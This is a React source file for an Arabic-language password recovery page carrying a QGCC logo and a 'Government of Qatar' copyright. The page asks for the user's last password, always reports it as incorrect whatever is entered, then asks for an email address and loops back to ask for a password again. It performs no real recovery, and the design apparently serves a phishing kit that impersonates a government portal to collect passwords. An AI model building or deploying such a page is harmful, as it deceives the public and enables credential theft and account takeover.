import React, { useState } from 'react';
import { Eye, EyeOff } from 'lucide-react';
import Header from './Header';

type Step = 'password' | 'email';

const ForgotPasswordPage: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<Step>('password');
  const [lastPassword, setLastPassword] = useState('');
  const [email, setEmail] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [passwordError, setPasswordError] = useState('');
  const [showErrorMessage, setShowErrorMessage] = useState(false);
  const [passwordRequirements, setPasswordRequirements] = useState({
    hasLower: false,
    hasUpper: false,
    hasNumber: false,
    hasMinLength: false,
    hasSymbol: false
  });

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Check password requirements
    if (!passwordRequirements.hasLower || !passwordRequirements.hasUpper || 
        !passwordRequirements.hasNumber || !passwordRequirements.hasMinLength || 
        !passwordRequirements.hasSymbol) {
      return;
    }
    
    // Always show error and move to email step
    setShowErrorMessage(true);
    setTimeout(() => {
      setShowErrorMessage(false);
      setCurrentStep('email');
      setLastPassword('');
    }, 2000);
  };

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Move back to password step
    setCurrentStep('password');
    setEmail('');
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#f8f9fa] font-sans" dir="rtl">
      {/* Unified Header */}
      <Header />

      {/* QGCC Logo Section */}
      <div className="flex flex-col items-center mt-10 mb-8 max-w-[1000px] mx-auto">
        <div className="flex items-center justify-center">
          <img src="/qgcc_LOGO.png" alt="QGCC Logo" className="h-[80px] w-auto" />
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex items-center justify-center px-4 py-12">
        <div className="w-full max-w-[600px] bg-white rounded-lg shadow-md p-8 md:p-12">
          {currentStep === 'password' && (
            <>
              {/* Title */}
              <h1 className="text-[22px] font-black text-[#2d3a5a] text-center mb-4">
                استعادة كلمة المرور
              </h1>
              
              {/* Description */}
              <p className="text-[15px] text-gray-600 text-center mb-8 leading-relaxed">
                يرجى إدخال آخر كلمة مرور استعملتها للتحقق من هويتك
              </p>

              {/* Error Message */}
              {showErrorMessage && (
                <div className="mb-6 p-4 bg-red-50 border-2 border-red-500 rounded-lg">
                  <p className="text-[14px] text-red-700 text-center font-black">
                    ❌ كلمة المرور غير صحيحة
                  </p>
                </div>
              )}

              {/* Form */}
              <form onSubmit={handlePasswordSubmit} className="space-y-6">
                {/* Last Password Field */}
                <div className="space-y-2">
                  <label className="block text-[14px] font-black text-gray-700 text-right">
                    آخر كلمة مرور استعملتها <span className="text-red-500">*</span>
                  </label>
                  <div className="relative">
                    <input
                      type={showPassword ? 'text' : 'password'}
                      value={lastPassword}
                      style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif' }}
                      onChange={(e) => {
                        const value = e.target.value;
                        // Block Hindi/Arabic numerals
                        const hindiNumeralsRegex = /[٠-٩۰-۹]/;
                        if (hindiNumeralsRegex.test(value)) {
                          setPasswordError('يرجى إدخال الأرقام الإنجليزية فقط (0-9) وليس الأرقام الهندية');
                          return;
                        }
                        // Allow only English letters, numbers, and special characters
                        const englishRegex = /^[a-zA-Z0-9%$#@&/\-_]*$/;
                        if (!englishRegex.test(value)) {
                          setPasswordError('يرجى إدخال الأحرف الإنجليزية والأرقام والرموز فقط');
                          return;
                        }
                        setPasswordError('');
                        setLastPassword(value);
                        
                        // Validate password requirements
                        setPasswordRequirements({
                          hasLower: /[a-z]/.test(value),
                          hasUpper: /[A-Z]/.test(value),
                          hasNumber: /[0-9]/.test(value),
                          hasMinLength: value.length >= 8,
                          hasSymbol: /[%$#@&/\-_]/.test(value)
                        });
                      }}
                      className="w-full px-4 py-3 border border-gray-300 rounded-sm text-left text-[15px] focus:outline-none focus:border-[#8a1538] transition-colors pr-12"
                      placeholder="أدخل آخر كلمة مرور"
                      required
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>
                  {passwordError && (
                    <p className="text-[#d9534f] text-[12px] mt-1">{passwordError}</p>
                  )}
                  {lastPassword && (!passwordRequirements.hasLower || !passwordRequirements.hasUpper || !passwordRequirements.hasNumber || !passwordRequirements.hasMinLength || !passwordRequirements.hasSymbol) && (
                    <div className="mt-2 text-[11px] space-y-1">
                      {!passwordRequirements.hasLower && <p className="text-[#d9534f]">✗ حرف صغير واحد على الأقل</p>}
                      {!passwordRequirements.hasUpper && <p className="text-[#d9534f]">✗ حرف كبير واحد على الأقل</p>}
                      {!passwordRequirements.hasNumber && <p className="text-[#d9534f]">✗ رقم واحد على الأقل</p>}
                      {!passwordRequirements.hasMinLength && <p className="text-[#d9534f]">✗ الحد الأدنى لطول كلمة المرور 8 أحرف</p>}
                      {!passwordRequirements.hasSymbol && <p className="text-[#d9534f]">✗ رمز واحد على الأقل (% $ # @ & / - _)</p>}
                    </div>
                  )}
                </div>

                {/* Buttons */}
                <div className="space-y-3">
                  <button
                    type="submit"
                    className="w-full bg-[#8a1538] text-white font-black py-3.5 rounded-sm text-[16px] hover:bg-[#640d2b] transition-colors shadow-md"
                  >
                    التحقق
                  </button>
                  
                  <button
                    type="button"
                    onClick={() => window.history.back()}
                    className="w-full bg-gray-200 text-gray-700 font-black py-3.5 rounded-sm text-[16px] hover:bg-gray-300 transition-colors"
                  >
                    رجوع
                  </button>
                </div>
              </form>
            </>
          )}

          {currentStep === 'email' && (
            <>
              {/* Title */}
              <h1 className="text-[22px] font-black text-[#2d3a5a] text-center mb-4">
                إرسال كلمة المرور
              </h1>
              
              {/* Description */}
              <p className="text-[15px] text-gray-600 text-center mb-8 leading-relaxed">
                أدخل الإيميل الذي تريد أن نرسل كلمة المرور عليه
              </p>

              {/* Form */}
              <form onSubmit={handleEmailSubmit} className="space-y-6">
                {/* Email Field */}
                <div className="space-y-2">
                  <label className="block text-[14px] font-black text-gray-700 text-right">
                    البريد الإلكتروني <span className="text-red-500">*</span>
                  </label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="w-full px-4 py-3 border border-gray-300 rounded-sm text-left text-[15px] focus:outline-none focus:border-[#8a1538] transition-colors"
                    placeholder="example@email.com"
                    required
                  />
                </div>

                {/* Buttons */}
                <div className="space-y-3">
                  <button
                    type="submit"
                    className="w-full bg-[#8a1538] text-white font-black py-3.5 rounded-sm text-[16px] hover:bg-[#640d2b] transition-colors shadow-md"
                  >
                    إرسال
                  </button>
                  
                  <button
                    type="button"
                    onClick={() => setCurrentStep('password')}
                    className="w-full bg-gray-200 text-gray-700 font-black py-3.5 rounded-sm text-[16px] hover:bg-gray-300 transition-colors"
                  >
                    رجوع
                  </button>
                </div>
              </form>
            </>
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-white border-t border-gray-200 py-4 mt-auto">
        <div className="max-w-7xl mx-auto px-4 text-center">
          <p className="text-[13px] text-gray-600">
            © 2026 حكومة قطر
          </p>
        </div>
      </footer>
    </div>
  );
};

export default ForgotPasswordPage;
